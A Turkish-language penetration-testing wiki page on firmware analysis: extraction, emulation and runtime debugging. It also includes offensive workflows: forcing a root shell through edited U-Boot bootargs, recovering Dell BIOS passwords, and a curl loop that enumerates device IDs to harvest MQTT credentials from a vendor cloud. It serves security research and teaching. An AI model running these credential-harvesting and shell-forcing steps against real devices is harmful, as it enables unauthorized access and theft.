# Firmware Analysis

{{#include ../../banners/hacktricks-training.md}}

{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/dds-rtps-security.md
{{#endref}}

## **Giriş**

### İlgili kaynaklar

{{#ref}}
uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

Firmware, donanım bileşenleri ile kullanıcıların etkileşimde bulunduğu yazılımlar arasındaki iletişimi yönetip kolaylaştırarak cihazların doğru şekilde çalışmasını sağlayan temel yazılımdır. Kalıcı bellekte saklanır; böylece cihaz, açıldığı andan itibaren gerekli talimatlara erişebilir ve işletim sistemini başlatabilir. Güvenlik açıklarını belirlemek için firmware'i incelemek ve olası değişiklikler yapmak kritik bir adımdır.<sup>[[2]](#references)[[3]](#references)</sup>

## **Bilgi Toplama**

**Bilgi toplama**, bir cihazın bileşenlerini ve kullandığı teknolojileri anlamanın kritik ilk adımıdır. Bu süreçte aşağıdakiler hakkında veri toplanır:

- CPU mimarisi ve çalıştırdığı işletim sistemi
- Bootloader özellikleri
- Donanım yerleşimi ve veri sayfaları
- Kod tabanı ölçümleri ve kaynak konumları
- Harici kütüphaneler ve lisans türleri
- Güncelleme geçmişi ve düzenleyici sertifikaları
- Mimari ve akış diyagramları
- Güvenlik değerlendirmeleri ve belirlenen güvenlik açıkları

Bu amaçla **open-source intelligence (OSINT)** araçları çok değerlidir. Ayrıca mevcut açık kaynaklı yazılım bileşenleri, manuel ve otomatik inceleme süreçleriyle analiz edilebilir. [Coverity Scan](https://scan.coverity.com) ve [Semmle’s LGTM](https://lgtm.com/#explore) gibi araçlar, olası sorunları bulmak için kullanılabilecek ücretsiz statik analiz olanağı sunar.

## **Firmware'i Edinme**

Firmware'i edinmek için farklı yöntemler kullanılabilir; her yöntemin karmaşıklık düzeyi farklıdır:

- Kaynaktan (**geliştiricilerden veya üreticilerden**) **doğrudan** edinmek
- Sağlanan talimatları kullanarak **derlemek**
- Resmî destek sitelerinden **indirmek**
- Barındırılan firmware dosyalarını bulmak için **Google dork** sorgularından yararlanmak
- [S3Scanner](https://github.com/sa7mon/S3Scanner) gibi araçlarla **cloud storage** alanlarına doğrudan erişmek
- **Man-in-the-middle** teknikleriyle **güncellemeleri** yakalamak
- **UART**, **JTAG** veya **PICit** gibi bağlantılar üzerinden cihazdan **çıkarmak**
- Cihaz iletişimi sırasında güncelleme isteklerini **dinlemek**
- **Hardcoded güncelleme uç noktalarını** belirleyip kullanmak
- Bootloader'dan veya ağ üzerinden **dump almak**
- Diğer yöntemler başarısız olduğunda uygun donanım araçlarıyla depolama çipini **çıkarıp okumak**

### Yalnızca UART günlükleri: flash'taki U-Boot env ile root shell'i zorlamak

UART RX yok sayılıyorsa (yalnızca günlükler alınıyorsa), U-Boot environment blob'unu çevrimdışı **düzenleyerek** yine de bir init shell açmaya zorlayabilirsiniz:<sup>[[6]](#references)</sup>

1. SPI flash'ı SOIC-8 klipsi ve programlayıcıyla dump edin (3.3V):
   ```bash
   flashrom -p ch341a_spi -r flash.bin
   ```
2. U-Boot env partition’ını bulun, `bootargs` değerini `init=/bin/sh` içerecek şekilde düzenleyin ve blob için **U-Boot env CRC32 değerini yeniden hesaplayın**.
3. Yalnızca env partition’ını yeniden flash’leyip yeniden başlatın; UART üzerinden bir shell açılmalıdır.

Bu, bootloader shell’i devre dışı bırakılmış ancak env partition’ına harici flash erişimiyle yazılabilen embedded cihazlarda kullanışlıdır.

## Firmware’i analiz etme

Artık **firmware’e sahipsiniz**; onu nasıl ele alacağınızı anlamak için firmware’den bilgi çıkarmanız gerekir. Bunun için kullanabileceğiniz farklı araçlar:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```

Bu araçlarla fazla bir şey bulamazsanız, `binwalk -E <bin>` ile imajın **entropisini** kontrol edin. Entropi düşükse imajın şifrelenmiş olması pek olası değildir. Entropi yüksekse büyük olasılıkla şifrelenmiştir (veya bir şekilde sıkıştırılmıştır).

Ayrıca, **firmware içine gömülü dosyaları** çıkarmak için şu araçları kullanabilirsiniz:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Dosyayı incelemek için [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) aracını da kullanabilirsiniz.

### Farklılaştırmalı flash analizi ve kurtarılabilir XOR gizli depoları

Bir firmware ayarının belgelenmiş bir depolama biçimi yoksa önce eşleşen birkaç flash okuması alın, **tam olarak bir** ayarı değiştirin, yonganın tamamını yeniden dökümleyin ve ofsetleri karşılaştırın. Deneyi kontrollü değerlerle tekrarlamak, ayarın sayaçlardan ve yazma meta verilerinden ayırt edilmesini sağlar; yerinde değişiklik yerine yeni ofsetlerde görülen değişiklikler, yalnızca eklemeli veya günlük yapılı bir depolamaya işaret eder. Silinmiş/tombstone olarak işaretlenmiş girdileri koruyun; içerik baytları hâlâ kurtarılabilir olabilir.<sup>[[10]](#references)[[11]](#references)</sup>

```bash
sha256sum baseline-1.bin baseline-2.bin baseline-3.bin
cmp -l baseline-1.bin changed.bin
```

Bölgeyi bulduktan sonra, `binwalk` gibi araçlarla firmware modüllerini çıkarın ve yazıcıyı/doğrulayıcıyı Ghidra'da reverse edin. Şemayı yalnızca şifreli metin örüntülerinden çıkarsamak yerine, alan sınırlarını, padding'i, key indekslemesini ve key türetmeyi kodda doğrulayın.<sup>[[10]](#references)</sup>

#### Şifrelenmiş sıfır padding'den key'leri kurtarma

[XOR-based encryption](../../crypto/symmetric/#xor-based-encryption) bölümünde açıklandığı gibi, bilinen plaintext aynı offset'lerdeki keystream baytlarını açığa çıkarır. Sabit boyutlu bir alan, sıfır padding'i tekrarlanan bir XOR key'inin tüm indekslerini kapsadığında özellikle savunmasızdır: Şifrelenmiş padding, bu key baytlarını doğrudan açığa çıkarır; çünkü `0x00 XOR key_byte = key_byte`. Her key indeksi kapsanıyorsa, key'i ciphertext'in sonundan yeniden oluşturun ve dolu baytların şifresini çözün.<sup>[[10]](#references)</sup>

Dell'in savunmasız DVAR BIOS-password biçimi somut bir örnektir: 32 baytlık bir alanın `0` baytı plaintext'tir; `1..31` baytları ise tekrarlanan 20 baytlık bir key kullanır.<sup>[[10]](#references)</sup>

```text
stored[0] = password[0]
stored[i] = password[i] XOR key[(i - 1) mod 20]  # i = 1..31
```

Parola uzunluğu `L` için, XOR işleminden önce `L..31` konumları sıfırdı. `L <= 12` olduğunda bu konumlar tüm anahtar indekslerini kapsar; böylece brute force gerekmeden anahtarın ve parolanın tamamı kurtarılır:<sup>[[10]](#references)</sup>

```text
key[(i - 1) mod 20] = stored[i]                  # padding positions
password[i] = stored[i] XOR key[(i - 1) mod 20] # populated positions
```

#### Geçmiş kayıtlardan anahtarları çıkarın

Her kaydı bağımsız olarak analiz etmeyin. DVAR anahtarı yaklaşık olarak `modified_md5(device_seed || variable_GUID || password[0])` şeklinde türetilir: cihaz tohumu ve GUID sabittir; parolaya bağlı tek girdi, açık metin hâlindeki ilk bayttır. Bu, cihaz başına en fazla 256 anahtar olmasını sağlar ve aynı baytla başlayan kayıtların aynı anahtarı paylaşmasına yol açar. Etkin ve silinmiş kayıtları bu bayta göre gruplandırın; kısa bir geçmiş kaydı, padding aracılığıyla tam anahtarı leak edebilir ve kendi padding'i yetersiz olan daha uzun, güncel bir kaydın şifresini çözebilir. Bu nedenle eski şifreli metin silinmek yerine tombstone olarak işaretlendiğinde parola rotasyonu maruziyeti artırabilir.<sup>[[10]](#references)</sup>

[`dellpwn`](https://github.com/R3n5k1/dellpwn) aracı DVAR'ı bulur, aday kayıtları doğrular, parolaları kurtarır ve depolanan ham baytları/anahtar baytlarını görüntüleyebilir. Aracı bir checkout'tan derleyin ve doğrulanmış bir flash imajını şu şekilde tarayın:<sup>[[11]](#references)</sup>

```bash
cargo install --path .
dellpwn scan dump.bin --raw
dellpwn scan dump.bin --partial  # include uncertain recoveries
```

Özel parser'larda kayıt yapısını, yazdırılabilir karakter kısıtlarını, sıfır padding kontrollerini, key entropy'sini ve key'in tekrarlandığı noktalardaki tutarlılığı kullanarak false positive'leri reddedin. Tekrarlanan dump'larda yazma başına seyrek bit flip'leri görülüyorsa, gözlemlenen maskeleri listeleyin ve bu kısıtları kullanarak düzeltmeleri sıralayın; ancak belirsiz karakterleri, sezgisel çıktıyı kesin kurtarma gibi sunmak yerine belirsiz olarak raporlayın.<sup>[[10]](#references)</sup>

Password verifier'ları, geri döndürülebilir ciphertext yerine salt eklenmiş, iterasyonlu, tek yönlü bir hash saklamalı; log-structured depolar ise kullanım dışı kalan gizli verileri güvenli biçimde silmelidir.<sup>[[10]](#references)</sup>

### Dosya Sistemini Elde Etme

Önceden bahsedilen `binwalk -ev <bin>` gibi araçlarla **dosya sistemini çıkarmış** olmanız gerekir.\
Binwalk genellikle onu, **dosya sistemi türünün adıyla adlandırılmış bir klasöre** çıkarır. Bu klasör genellikle şu adlardan birini taşır: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Dosya Sistemini Manuel Olarak Çıkarma

Bazen binwalk, dosya sisteminin magic byte değerini imzaları arasında bulundurmaz. Böyle durumlarda binwalk'ı kullanarak **dosya sisteminin offset'ini bulun ve sıkıştırılmış dosya sistemini** binary'den carve edin; ardından aşağıdaki adımları izleyerek dosya sistemi türüne göre **manuel olarak çıkarın**.

```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```

Squashfs dosya sistemini carve etmek için aşağıdaki **dd command**'i çalıştırın.

```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```

Alternatif olarak aşağıdaki komut da çalıştırılabilir.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- squashfs için (yukarıdaki örnekte kullanılmıştır)

`$ unsquashfs dir.squashfs`

Dosyalar daha sonra "`squashfs-root`" dizininde bulunur.

- CPIO arşiv dosyaları

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- jffs2 dosya sistemleri için

`$ jefferson rootfsfile.jffs2`

- NAND flash kullanan ubifs dosya sistemleri için

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## Firmware'i Analiz Etme

Firmware elde edildikten sonra, yapısını ve olası güvenlik açıklarını anlamak için onu incelemek önemlidir. Bu süreç, firmware görüntüsündeki değerli verileri analiz etmek ve çıkarmak için çeşitli araçların kullanılmasını içerir.

### İlk Analiz Araçları

İkili dosyayı ( `<bin>` olarak anılır) ilk incelemek için bir dizi komut verilmiştir. Bu komutlar dosya türlerini belirlemeye, string'leri çıkarmaya, ikili verileri analiz etmeye ve bölüm ile dosya sistemi ayrıntılarını anlamaya yardımcı olur:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```

Görüntünün şifreleme durumunu değerlendirmek için `binwalk -E <bin>` ile **entropi** kontrol edilir. Düşük entropi şifreleme olmadığını, yüksek entropi ise olası şifreleme veya sıkıştırmayı gösterir.

**Gömülü dosyaları** çıkarmak için **file-data-carving-recovery-tools** belgeleri ve dosyaları incelemek için **binvis.io** gibi araçlar ve kaynaklar önerilir.

### Dosya Sistemini Çıkarma

`binwalk -ev <bin>` kullanarak genellikle dosya sistemi çıkarılabilir ve çoğunlukla dosya sistemi türünün adını taşıyan bir dizine (ör. squashfs, ubifs) yerleştirilir. Ancak **binwalk**, magic byte'lar eksik olduğu için dosya sistemi türünü tanıyamadığında manuel çıkarma gerekir. Bunun için `binwalk` ile dosya sisteminin offset'ini bulup ardından `dd` komutunu kullanarak dosya sistemini ayıklamak gerekir:

```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```

Sonrasında, dosya sistemi türüne (ör. squashfs, cpio, jffs2, ubifs) bağlı olarak içerikleri manuel şekilde çıkarmak için farklı komutlar kullanılır.

### Dosya Sistemi Analizi

Dosya sistemi çıkarıldıktan sonra güvenlik açıkları aranmaya başlanır. Güvenli olmayan ağ daemon'ları, hardcoded kimlik bilgileri, API endpoint'leri, güncelleme sunucusu işlevleri, derlenmemiş kodlar, başlangıç betikleri ve çevrimdışı analiz için derlenmiş binary'ler incelenir.

İncelenmesi gereken **önemli konumlar** ve **öğeler** şunlardır:

- Kullanıcı kimlik bilgileri için **etc/shadow** ve **etc/passwd**
- **etc/ssl** içindeki SSL sertifikaları ve anahtarları
- Olası güvenlik açıkları için yapılandırma ve betik dosyaları
- İleri analiz için gömülü binary'ler
- Yaygın IoT cihazı web sunucuları ve binary'leri

Dosya sistemindeki hassas bilgileri ve güvenlik açıklarını ortaya çıkarmaya çeşitli araçlar yardımcı olur:

- Hassas bilgi araması için [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) ve [**Firmwalker**](https://github.com/craigz28/firmwalker)
- Kapsamlı firmware analizi için [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core)
- Statik ve dinamik analiz için [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go) ve [**EMBA**](https://github.com/e-m-b-a/emba)

### Derlenmiş Binary'lerde Güvenlik Kontrolleri

Dosya sisteminde bulunan hem kaynak kod hem de derlenmiş binary'ler güvenlik açıkları açısından dikkatle incelenmelidir. Unix binary'leri için **checksec.sh**, Windows binary'leri içinse **PESecurity** gibi araçlar, istismar edilebilecek korumasız binary'leri belirlemeye yardımcı olur.

## Türetilmiş URL token'ları aracılığıyla cloud yapılandırmasını ve MQTT kimlik bilgilerini toplama

Birçok IoT hub'ı, cihaza özel yapılandırmasını şu biçimdeki bir cloud endpoint'inden alır:<sup>[[5]](#references)</sup>

- `https://<api-host>/pf/<deviceId>/<token>`

Firmware analizi sırasında, `<token>` değerinin cihaz kimliğinden hardcoded bir secret kullanılarak yerel olarak türetildiğini görebilirsiniz. Örneğin:

- token = MD5( deviceId || STATIC_KEY ) ve büyük harfli hex olarak gösterilir

Bu tasarım, deviceId ve STATIC_KEY değerlerini öğrenen herkesin URL'yi yeniden oluşturup cloud yapılandırmasını çekmesine olanak tanır; bu da genellikle plaintext MQTT kimlik bilgilerini ve topic öneklerini açığa çıkarır.

Uygulamalı iş akışı:

1) UART boot log'larından deviceId değerini çıkarın

- 3.3V UART adaptörü (TX/RX/GND) bağlayıp log'ları yakalayın:

```bash
picocom -b 115200 /dev/ttyUSB0
```

- Örneğin, cloud config URL pattern'ini ve broker adresini yazdıran satırları arayın:

```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```

2) Firmware'den STATIC_KEY ve token algoritmasını kurtarın

- İkili dosyaları Ghidra/radare2'ye yükleyin ve config path ("/pf/") ya da MD5 kullanımını arayın.
- Algoritmayı doğrulayın (ör. MD5(deviceId||STATIC_KEY)).
- Token'ı Bash'te türetin ve digest'i büyük harfe çevirin:

```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```

3) Cloud config ve MQTT kimlik bilgilerini topla

- URL'yi oluşturup curl ile JSON'ı çek; sırları çıkarmak için jq ile ayrıştır:

```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```

4) Düz metin MQTT'yi ve zayıf topic ACL'lerini kötüye kullanın (varsa)

- Kurtarılan kimlik bilgilerini kullanarak bakım topic'lerine abone olun ve hassas olayları arayın:

```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
  -i <client_id> -u <username> -P <password> \
  -t "<topic_prefix>/<deviceId>/admin" -v
```

5) Tahmin edilebilir cihaz ID'lerini enumerate edin (ölçekli olarak, yetkilendirmeyle)

- Birçok ekosistemde vendor OUI/product/type byte'ları ve ardından gelen sıralı bir suffix bulunur.
- Aday ID'leri yineleyebilir, token'ları türetebilir ve config'leri programatik olarak çekebilirsiniz:

```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
  DEVICE_ID="${PREFIX}${SUF}"
  TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
  curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```

Notlar
- Toplu enumeration girişimlerinden önce her zaman açık yetki alın.
- Mümkün olduğunda, hedef donanımı değiştirmeden sırları kurtarmak için emülasyonu veya statik analizi tercih edin.


Firmware emülasyonu, bir cihazın çalışmasının veya tek bir programın **dinamik analizini** mümkün kılar. Bu yaklaşım, donanım veya mimari bağımlılıkları nedeniyle zorluklarla karşılaşabilir; ancak kök dosya sistemini veya belirli binary'leri Raspberry Pi gibi mimarisi ve endianness'i eşleşen bir cihaza ya da önceden oluşturulmuş bir sanal makineye aktarmak, daha ileri testleri kolaylaştırabilir.

### Tekil Binary'leri Emüle Etme

Tek programları incelemek için programın endianness'ini ve CPU mimarisini belirlemek kritik önem taşır.

#### MIPS Mimarisi Örneği

Bir MIPS mimarisi binary'sini emüle etmek için şu komut kullanılabilir:

```bash
file ./squashfs-root/bin/busybox
```

Gerekli emülasyon araçlarını yüklemek için:

```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```

MIPS (big-endian) için `qemu-mips` kullanılır; little-endian ikili dosyalar içinse `qemu-mipsel` tercih edilir.

#### ARM Architecture Emulation

ARM ikili dosyaları için süreç benzerdir; emülasyonda `qemu-arm` emülatörü kullanılır.

### Full System Emulation

[Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) ve benzeri araçlar, tüm firmware'in emülasyonunu kolaylaştırır, süreci otomatikleştirir ve dinamik analize yardımcı olur.

### Emülasyon için bölünmüş ve doğrulanmış root dosya sistemlerini yeniden oluşturma

Bir SquashFS superblock okunabiliyor ancak inode, dizin veya fragment-table offset'leri olanaksız görünüyorsa, `unsquashfs`'i hemen yamalamayın. Erken başlatma ikili dosyasını tersine mühendislikle inceleyin ve oluşturduğu block-device grafiğini yeniden üretin: gömülü sistemler nominal bir root partition sunabilir, ancak başka bir partition'dan alınan sektörleri ekleyen bir `dm-linear` eşlemesiyle gerçek dosya sistemini oluşturabilir. Yalnızca superblock üzerinde yapılan kontroller başarılı olabilir; buna rağmen sonraki tüm metadata blokları yanlış konumda olabilir.<sup>[[9]](#references)</sup>

Firmware'in aritmetiğini aynen koruyun. Özellikle uzunlukların bayt, 512 baytlık sektör veya 4 KiB'lık sayfa cinsinden olup olmadığını belirleyin; kaydırma ve kırpma işlemlerini özgün sıralarıyla uygulayın ve A/B düzenlerindeki bankaya bağlı kuyruk bölgelerini hesaba katın. Örneğin, `(partition_bytes >> 12) << 3` önce değeri 4 KiB sınırına kırpar ve ancak sonra sonucu 512 baytlık sektör cinsinden ifade eder; bunu `partition_bytes // 512` ile değiştirmek, eklenen extent'i birkaç kilobayt kaydırabilir ve sonraki tüm SquashFS tablolarını bozabilir.<sup>[[9]](#references)</sup>

Yararlı bir doğrulama iş akışı:<sup>[[9]](#references)</sup>

1. Doğrulayıcı/init ikili dosyasından her `dm-linear` segmentinin kaynak aygıtını, başlangıç sektörünü ve uzunluğunu belirleyin.
2. Hizalama semantiğini değiştirmeden extent'leri birleştirin veya eşleyin.
3. Çıkarma yine başarısız olursa, yalnızca tahmin edilen sınırın çevresindeki küçük bir aralıkta arama yapın ve tek başına makul görünen bir superblock'ü kabul etmek yerine art arda gelen birkaç geçerli metadata yapısının bulunmasını şart koşun.
4. Yeniden oluşturulan imaj üzerinde değiştirilmemiş bir `unsquashfs` çalıştırın; tüm dizinlerin ve fragment'lerin başarıyla taranması, `unsquashfs -stat` çıktısından daha güçlü bir kanıttır.

#### Analyst-controlled dm-verity replacement

Analist QEMU kernel'ini, initramfs'i ve sanal diskleri kontrol ediyorsa, satıcıya ait doğrulama PID 1'i küçük, statik olarak bağlanmış bir init ile değiştirerek değiştirilmiş bir root başlatılabilir. Bu, **lab boot-chain substitution** işlemidir; dm-verity'nin, RSA imzasının, Secure Boot'un veya TPM'ye mühürlenmiş bir anahtarın kırılması değildir.<sup>[[9]](#references)</sup>

Yedek init, özgün başlatma yolunun işlevsel kısımlarını taklit etmelidir: `devtmpfs`'i bağlamalı, `setsid()` çağırmalı, `/dev/console`'ı 0–2 dosya tanımlayıcılarına bağlamalı, `/proc` ve `/sys`'i bağlamalı, sağlanan block device'ı beklemeli, düzenlenmiş root'u salt okunur bağlamalı, eski root'un sahte dosya sistemlerini ayırmalı, yeni mount'u `/` üzerine taşımalı, `chroot` yapmalı ve firmware'in özgün `/sbin/init` dosyasını `execve()` ile çalıştırmalıdır. `/dev`, `/proc` ve `/sys`'i `MS_MOVE` **öncesinde** ayırmak, yeni root'a ait mount noktalarının yanlışlıkla ayrılmasını önler.<sup>[[9]](#references)</sup>

Değiştirilebilir aygıt durumunu, değiştirilmiş salt okunur root'tan ayrı tutun. Bir qcow2 overlay, özgün diskin LVM durumunu korurken ikinci bir salt okunur virtio disk, düzenlenmiş SquashFS'i sağlayabilir:<sup>[[9]](#references)</sup>

```bash
qemu-img create -f qcow2 -F raw -b emmc.raw overlay.qcow2
qemu-system-x86_64 ... -kernel bzImage -initrd custom-initramfs.cpio.gz \
  -drive if=none,id=emmc,format=qcow2,file=overlay.qcow2 \
  -device sdhci-pci -device sd-card,drive=emmc \
  -drive if=virtio,format=raw,readonly=on,file=rootfs-edited.squashfs
```

#### Çevrimdışı imaj durumu hata ayıklaması

Yavaş açılışlar, yıkıcı başlangıç betikleri veya güvenilir olmayan konsol günlükleri hatayı belirsizleştirdiğinde, kalıcı durumu guest dışında inceleyin. Çalışan bir VM'nin kullandığı overlay'i asla bağlamayın; imajı `qemu-nbd` ile erişime açın, LVM keşfini amaçlanan NBD bölümüyle sınırlandırın ve bağlantıyı kesmeden önce volume group'u devre dışı bırakın.<sup>[[9]](#references)</sup>

```bash
sudo modprobe nbd max_part=16
sudo qemu-nbd --connect=/dev/nbd0 overlay.qcow2
sudo vgscan --config 'devices { filter = ["a|/dev/nbd0p4|", "r|.*|"] }'
# inspect/fsck/mount the discovered logical volumes
sudo vgchange -an VG_NAME
sudo qemu-nbd --disconnect /dev/nbd0
```

Tekrarlanabilir hata yalıtımı için, zaman damgalı işaretçi dosyalarını kararlı ve yazılabilir bir birime yazın ve bunları çevrimdışı doğrulayın; `/dev/kmsg`, FIFO'lar ve geçici konsollar, rate limiting veya sürecin erken sonlanması nedeniyle yanlış negatif sonuçlara yol açabilir. Ayrıca ilgisiz kodları değiştirmeden önce katmanlar arasındaki arayüzleri birebir karşılaştırın: `uname -r` ile `/lib/modules/`, diskteki ext4 özellikleri ile kernel yapılandırması ve Mesa `libGL` sürümü ile DRI driver ABI'si ve PCI'dan türetilen driver adları. Bir bileşen mevcut olabilir ve hatta `dlopen()` ile başarıyla yüklenebilir; ancak onu kullanan bileşen farklı bir ABI beklediği için yine de kullanılamaz olabilir.<sup>[[9]](#references)</sup>

## Pratikte Dinamik Analiz

Bu aşamada analiz için gerçek veya emüle edilmiş bir cihaz ortamı kullanılır. İşletim sistemine ve dosya sistemine shell erişimini sürdürmek çok önemlidir. Emülasyon donanım etkileşimlerini kusursuz biçimde taklit edemeyebilir; bu nedenle emülasyonu zaman zaman yeniden başlatmak gerekebilir. Analizde dosya sistemi yeniden incelenmeli, dışa açılmış web sayfaları ve ağ servisleri exploit edilmeli, bootloader açıkları araştırılmalıdır. Olası backdoor açıklarını belirlemek için firmware bütünlük testleri kritik önem taşır.

## Çalışma Zamanı Analiz Teknikleri

Çalışma zamanı analizi, bir süreç veya binary ile çalıştığı ortamda etkileşim kurmayı içerir. Bu analizde breakpoint ayarlamak ve fuzzing ile diğer teknikleri kullanarak açıkları belirlemek için gdb-multiarch, Frida ve Ghidra gibi araçlardan yararlanılır.

Tam bir debugger bulunmayan gömülü hedeflerde, **statik bağlı bir `gdbserver`'ı** cihaza kopyalayın ve uzaktan bağlanın:<sup>[[6]](#references)</sup>

```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```

### Zigbee / radio-co-processor mesaj eşleme

IoT hub'larda RF stack'i genellikle bir **radio MCU** ile Linux userland process'i arasında bölünür. Kullanışlı bir iş akışı, yolu eşlemektir:<sup>[[8]](#references)</sup>

1. Havada taşınan **RF frame**
2. **Controller** tarafındaki parser (radio MCU üzerinde)
3. Linux'a iletilen **serial/UART text veya TLV protocol** (örneğin `/dev/tty*`)
4. Ana daemon içindeki **application dispatcher**
5. **Protocol-specific handler / state machine**

Bu mimari, tek bir hedef yerine tersine mühendislik için iki hedef oluşturur. Controller, binary radio frame'leri `Group,Command,arg1,arg2,...` gibi metinsel bir protocol'e dönüştürüyorsa şunları ortaya çıkarın:

- **Message group**'ları ve dispatch table'ları
- Hangi mesajların **network**'ten, hangilerinin controller'ın kendisinden gelebileceği
- Tam **manufacturer-specific discriminator field**'ları (örneğin Zigbee `manufacturer_code` ve özel `cluster_command`)
- Yalnızca **commissioning**, discovery veya firmware/model indirme aşamalarında erişilebilen handler'lar

Özellikle Zigbee için pairing trafiğini yakalayın ve hedefin hâlâ varsayılan **Link Key** `ZigBeeAlliance09` değerini kullanıp kullanmadığını kontrol edin. Kullanıyorsa commissioning trafiğini dinlemek **Network Key**'i açığa çıkarabilir. Zigbee 3.0 install code'ları bu riski azaltır; bu nedenle test edilen cihazın bunları gerçekten zorunlu kılıp kılmadığını not edin.

### Üreticiye özel protocol handler'ları ve FSM ile kısıtlanan erişilebilirlik

Üreticiye özel Zigbee/ZCL komutları, standart cluster'lardan genellikle daha iyi hedeflerdir; çünkü daha az sınanmış validation koduna sahip **custom parsing code** ve dahili **FSM**'lere ulaşırlar.<sup>[[8]](#references)</sup>

Uygulanabilir iş akışı:

- **Vendor-only handler**'ı bulana kadar command dispatcher'ı tersine mühendislikle inceleyin.
- **FSM state**, **event**, **check**, **action** ve **next-state** table'larını ortaya çıkarın.
- Otomatik ilerleyen **transitional state**'leri ve sonunda saldırganın kontrolündeki state'i sıfırlayan veya serbest bırakan retry/error branch'lerini belirleyin.
- Hatalı handler'ın her zaman erişilebilir olduğunu varsaymak yerine, daemon'ı savunmasız duruma getirmek için hangi meşru protocol alışverişlerinin gerektiğini doğrulayın.

Zamanlamaya duyarlı protocol'lerde, bir Python framework'ünden packet replay yapmak çok yavaş olabilir. Daha güvenilir bir yaklaşım, doğru **endpoint**, **attribute** ve commissioning zamanlamasını ortaya çıkarmak için vendor-grade stack kullanarak gerçek donanım üzerinde (örneğin bir **nRF52840**) meşru bir cihazı taklit etmektir.

### Embedded daemon'lardaki parçalı indirme bug sınıfı

Tekrarlayan bir firmware bug sınıfı, **parçalı blob/model/configuration indirmelerinde** görülür:<sup>[[8]](#references)</sup>

1. **İlk fragment** (`offset == 0`), `ctx->total_size` değerini saklar ve `malloc(total_size)` ile bellek ayırır.
2. Sonraki fragment'ler yalnızca `packet_total_size >= offset + chunk_len` gibi saldırganın kontrol ettiği **packet-local** alanları doğrular.
3. Kopyalama işlemi, **başlangıçta ayrılan boyuta** göre kontrol yapmadan `memcpy(&ctx->buffer[offset], chunk, chunk_len)` kullanır.

Bu, saldırganın şunları göndermesine olanak tanır:

- Küçük bir heap allocation yapılmasını sağlamak için beyan edilen toplam boyutu **küçük** olan geçerli bir ilk fragment.
- **Beklenen offset**'e, ancak daha büyük bir `chunk_len` değerine sahip sonraki bir fragment.
- Yeni kontrolleri karşılarken başlangıçta ayrılan buffer'ı taşıran, sahte bir packet-local size.

Savunmasız yol commissioning mantığının arkasındaysa, hatalı fragment'leri göndermeden önce hedefi beklenen model-download veya blob-download durumuna getirmek için yeterli **device emulation** da exploit'e dahil edilmelidir.

### Protocol kaynaklı `free()` tetikleyicileri

